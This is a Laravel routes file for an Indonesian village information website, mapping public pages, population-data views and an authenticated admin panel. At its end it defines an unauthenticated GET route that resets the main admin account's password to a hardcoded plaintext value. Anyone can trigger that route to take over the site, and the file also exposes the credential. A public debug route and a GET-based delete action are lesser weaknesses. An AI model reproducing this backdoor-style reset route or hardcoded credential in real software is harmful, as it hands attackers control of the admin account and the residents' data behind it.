<?php

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\authController;
use App\Http\Controllers\dataController;
use App\Http\Controllers\homeController;
use App\Http\Controllers\adminController;
use App\Http\Controllers\galleryController;
use App\Http\Controllers\NotificationTokenController;

/*
|--------------------------------------------------------------------------
| Rute Utama Publik
|--------------------------------------------------------------------------
*/

// Beranda
Route::get('/', [homeController::class, 'index'])->name('home');

// Profil Desa
Route::get('/about', [homeController::class, 'about'])->name('about');
Route::get('/pemerintahan', [homeController::class, 'pemerintahan'])->name('pemerintahan');
Route::get('/potensi-desa', [homeController::class, 'potensidesa'])->name('potensidesa');
Route::get('/visi', [homeController::class, 'visi'])->name('visi');
Route::get('/sejarah', [homeController::class, 'sejarah'])->name('sejarah');

// Galeri
Route::get('/galeri-desa', [galleryController::class, 'galeri'])->name('galeri');

// Kontak
Route::get('/kontak-desa', [homeController::class, 'kontak'])->name('kontak');
Route::post('/kontak-desa', [homeController::class, 'sendkontak'])->name('send.message');

// Berita
Route::get('/berita', [homeController::class, 'berita'])->name('berita');
Route::get('/berita/{tanggal}/{judul}', [homeController::class, 'tampilberita'])->name('detailartikel');

// Pengaduan
Route::post('/pengaduan', [homeController::class, 'store'])->name('pengaduan.store');
// Data Desa
Route::prefix('data')->group(function () {
    Route::get('/penduduk', [dataController::class, 'penduduk'])->name('data.penduduk');
    Route::get('/kk', [dataController::class, 'kk'])->name('data.kk');
    Route::get('/pendidikan', [dataController::class, 'pendidikan'])->name('data.pendidikan');
    Route::get('/kesehatan', [dataController::class, 'kesehatan'])->name('data.kesehatan');
    Route::get('/siswa', [dataController::class, 'siswa'])->name('data.siswa');
    Route::get('/profesi', [dataController::class, 'profesi'])->name('data.profesi');
    Route::get('/klub', [dataController::class, 'klub'])->name('data.klub');
    Route::get('/kesenian', [dataController::class, 'kesenian'])->name('data.kesenian');
    Route::get('/sumber-air', [dataController::class, 'sumberair'])->name('data.sumberair');
    Route::get('/rw/{rw}', [dataController::class, 'rw'])->name('data.rw');
});

// API / Token / Grafik
Route::get('/getdatades', [dataController::class, 'getChartData'])->name('getdatades');
Route::post('/save-token', [NotificationTokenController::class, 'saveToken'])->name('save.token');

// Debug route for troubleshooting chart data
Route::get('/debug-chart-data', function () {
    return view('debug-chart-data');
})->name('debug.chart');

// Admin Data Management Routes
Route::middleware(['auth'])->prefix('admin')->name('admin.')->group(function () {
    Route::get('/data-management', [App\Http\Controllers\AdminDataController::class, 'index'])->name('data.index');
    Route::get('/data-management/{category}', [App\Http\Controllers\AdminDataController::class, 'show'])->name('data.show');
    Route::put('/data-management/{category}', [App\Http\Controllers\AdminDataController::class, 'update'])->name('data.update');
    Route::post('/data-management/{category}', [App\Http\Controllers\AdminDataController::class, 'store'])->name('data.store');
    Route::delete('/data-management/record/{id}', [App\Http\Controllers\AdminDataController::class, 'destroy'])->name('data.destroy');
    Route::get('/data-management/{category}/export', [App\Http\Controllers\AdminDataController::class, 'export'])->name('data.export');
});

Route::get('/admin', [authController::class, 'formlogin'])->name('formlogin');
Route::get('/login', fn () => redirect()->route('formlogin'));
Route::post('/login', [authController::class, 'login'])->name('login');
Route::get('/refresh-csrf', [authController::class, 'refreshCsrf'])->name('refresh-csrf');

/*
|--------------------------------------------------------------------------
| Panel Admin (Dilindungi Middleware Auth)
|--------------------------------------------------------------------------
*/

Route::prefix('admin')->middleware(['auth'])->group(function () {
    // Dashboard
    Route::get('/dashboard', [adminController::class, 'dashboard'])->name('dashboard');
    Route::get('/content/manage', [adminController::class, 'manageContent'])->name('content.manage');
    Route::get('/preview/{id}', [adminController::class, 'preview'])->name('preview');

    // Kelola Notifikasi
    Route::post('/send-notif', [NotificationTokenController::class, 'sendPushNotification'])->name('notif.send');

    // Galeri
    Route::get('/gallery', [galleryController::class, 'index'])->name('gallery.index');
    Route::post('/gallery/add', [galleryController::class, 'store'])->name('gallery.store');
    Route::get('/gallery/destroy/{id}', [galleryController::class, 'destroy'])->name('gallery.delete');

    // Manajemen Akun
    Route::get('/manage-akun', [authController::class, 'index'])->name('akun.manage');
    Route::get('/tambah-akun', [authController::class, 'create'])->name('akun.create');
    Route::post('/akun/update-role/{user}', [authController::class, 'updateRole'])->name('akun.roleupdate');
    Route::post('/akun/reset-password/{user}', [authController::class, 'resetPassword'])->name('akun.resetpass');
    Route::post('/akun/new-akun', [authController::class, 'store'])->name('akun.new');

    // Artikel & Konten
    Route::get('/content/add', [adminController::class, 'addartikel'])->name('addartikel');
    Route::post('/content/store', [adminController::class, 'storeartikel'])->name('artikel.store');
    Route::get('/artikel/{id}/edit', [adminController::class, 'editartikel'])->name('artikel.edit');
    Route::post('/artikel/{id}/update', [adminController::class, 'updateartikel'])->name('artikel.update');
    Route::delete('/artikel/{id}/delete', [adminController::class, 'deleteartikel'])->name('artikel.delete');

    // Kategori
    Route::post('/kategori/add', [adminController::class, 'tambahkategori'])->name('kategori.store');
    Route::delete('/kategori/delete/{id}', [adminController::class, 'deletekategori'])->name('kategori.delete');

    // RT/RW
    Route::get('/rtrw', [adminController::class, 'rtrw'])->name('rtrw');
    Route::get('/rw/add', [adminController::class, 'rwadd'])->name('rw.create');
    Route::post('/rw/store', [adminController::class, 'rwstore'])->name('rw.store');
    Route::delete('/rw/delete/{id}', [adminController::class, 'rwdelete'])->name('rw.delete');
    Route::get('/rt/add/{rw_id}', [adminController::class, 'rtadd'])->name('rt.create');
    Route::post('/rt/store', [adminController::class, 'rtstore'])->name('rt.store');
    Route::delete('/rt/delete/{id}', [adminController::class, 'rtdelete'])->name('rt.delete');

    // Data Statistik CRUD
    Route::get('/statistik', [App\Http\Controllers\StatistikController::class, 'index'])->name('statistik.index');
    Route::get('/statistik/create', [App\Http\Controllers\StatistikController::class, 'create'])->name('statistik.create');
    Route::post('/statistik', [App\Http\Controllers\StatistikController::class, 'store'])->name('statistik.store');
    Route::get('/statistik/{statistik}/edit', [App\Http\Controllers\StatistikController::class, 'edit'])->name('statistik.edit');
    Route::put('/statistik/{statistik}', [App\Http\Controllers\StatistikController::class, 'update'])->name('statistik.update');
    Route::delete('/statistik/{statistik}', [App\Http\Controllers\StatistikController::class, 'destroy'])->name('statistik.destroy');

    // Gambar & Profil
    Route::post('/img/upload', [adminController::class, 'uploadimg'])->name('img.upload');
    Route::post('/updateprofile', [adminController::class, 'upprofile'])->name('uploadprofile');

    // Ubah Status Artikel
    Route::post('/ubah/status', [adminController::class, 'ubahstatus'])->name('ubahstatus');

    // Logout
    Route::get('/logout', function () {
        Auth::logout();
        request()->session()->invalidate();
        request()->session()->regenerateToken();
        return redirect()->route('formlogin', ['logout' => '1']);
    })->name('logout');
});

Route::get('/panel', fn () => redirect()->away('https://mekarmukti.id:2083'));
Route::get('/cpanel', fn () => abort(404));

use Illuminate\Support\Facades\Hash;
use App\Models\User;

Route::get('/reset-password-admin', function () {
    $user = User::find(1); // ID admin
    $user->password = Hash::make('Kyura2133'); // password baru
    $user->save();
    return 'Password admin berhasil direset!';
});


